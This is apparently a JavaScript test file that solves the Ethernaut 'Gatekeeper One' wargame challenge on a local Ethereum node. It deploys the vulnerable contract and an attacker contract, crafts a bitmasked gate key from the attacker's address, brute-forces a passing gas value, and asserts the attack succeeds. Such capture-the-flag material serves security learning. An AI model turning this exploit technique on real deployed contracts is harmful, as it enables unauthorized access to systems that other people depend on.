
import { beforeEach, describe, it } from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { ethers } from "ethers";

const providerUrl = "http://127.0.0.1:8545";

const gatekeeperArtifact = JSON.parse(
  await readFile(
    new URL("../artifacts/contracts/GatekeeperOne.sol/GatekeeperOne.json", import.meta.url),
    "utf8"
  )
);

const attackerArtifact = JSON.parse(
  await readFile(
    new URL(
      "../artifacts/contracts/GatekeeperOneAttacker.sol/GatekeeperOneAttacker.json",
      import.meta.url
    ),
    "utf8"
  )
);

describe("Ethernaut Challenge 13: Gatekeeper One", () => {
  let provider;
  let deployer;
  let attacker;
  let gatekeeper;
  let gatekeeperAttacker;

  beforeEach(async () => {
    provider = new ethers.JsonRpcProvider(providerUrl);
    deployer = await provider.getSigner(0);
    attacker = await provider.getSigner(1);

    const gatekeeperFactory = new ethers.ContractFactory(
      gatekeeperArtifact.abi,
      gatekeeperArtifact.bytecode,
      deployer
    );

    gatekeeper = await gatekeeperFactory.deploy();
    await gatekeeper.waitForDeployment();

    const attackerFactory = new ethers.ContractFactory(
      attackerArtifact.abi,
      attackerArtifact.bytecode,
      attacker
    );

    gatekeeperAttacker = await attackerFactory.deploy(
      await gatekeeper.getAddress()
    );
    await gatekeeperAttacker.waitForDeployment();
  });

  it("starts without an entrant", async () => {
    assert.equal(await gatekeeper.entrant(), ethers.ZeroAddress);
  });

  it("allows the attacker to pass all three gates", async () => {
    const attackerAddress = await attacker.getAddress();

    // Low 16 bits match tx.origin; bits 16-31 are zero;
    // higher bits are nonzero.
    const keyValue =
      (1n << 32n) | (BigInt(attackerAddress) & 0xffffn);
    const key = ethers.toBeHex(keyValue, 8);

    let successfulGas;
    const searchStart = 30000n;
    const searchEnd = searchStart + 8191n;

    for (let gas = searchStart; gas < searchEnd; gas++) {
      try {
        await gatekeeperAttacker.connect(attacker).attack.staticCall(
          key,
          gas,
          { gasLimit: 150000 }
        );

        successfulGas = gas;
        break;
      } catch {
        // The candidate failed the gas gate. Try the next value.
      }
    }

    assert.notEqual(
      successfulGas,
      undefined,
      "Could not find a gas amount satisfying gateTwo"
    );

    await (
      await gatekeeperAttacker.connect(attacker).attack(key, successfulGas, {
        gasLimit: 150000,
      })
    ).wait();

    assert.equal(
      await gatekeeper.entrant(),
      attackerAddress
    );
  });
});

